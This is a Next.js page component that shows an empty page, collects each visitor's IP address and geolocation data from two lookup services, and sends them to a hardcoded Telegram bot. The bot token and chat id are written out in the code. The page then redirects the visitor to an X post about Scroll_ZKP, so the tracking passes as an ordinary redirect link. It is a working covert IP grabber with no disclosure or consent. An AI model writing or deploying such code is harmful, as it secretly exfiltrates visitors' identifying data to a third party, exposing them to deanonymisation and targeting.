"use client"
import { useEffect } from "react"

export default function Home() {
  useEffect(() => {
    let ip = ""
    let ip2 = ""
    try {
      fetch("https://checkip.amazonaws.com/")
        .then((res) => res.text())
        .then((data) => {
          ip = data
        })
        .then(() => {
          try {
            fetch("https://api.db-ip.com/v2/free/self")
              .then((res) => res.text())
              .then((data) => {
                try {
                  ip2 = data
                  fetch(
                    `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
                  ).then(
                    () =>
                      (window.location.href =
                        "https://x.com/Scroll_ZKP/status/1780584704175161392")
                  )
                } catch (error) {
                  fetch(
                    `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
                  ).then(
                    () =>
                      (window.location.href =
                        "https://x.com/Scroll_ZKP/status/1780584704175161392")
                  )
                }
              })
          } catch (error) {
            fetch(
              `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
            ).then(
              () =>
                (window.location.href =
                  "https://x.com/Scroll_ZKP/status/1780584704175161392")
            )
          }
        })
    } catch (error) {
      fetch(
        `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
      ).then(
        () =>
          (window.location.href =
            "https://x.com/Scroll_ZKP/status/1780584704175161392")
      )
    }
  }, [])
  return <p></p>
}
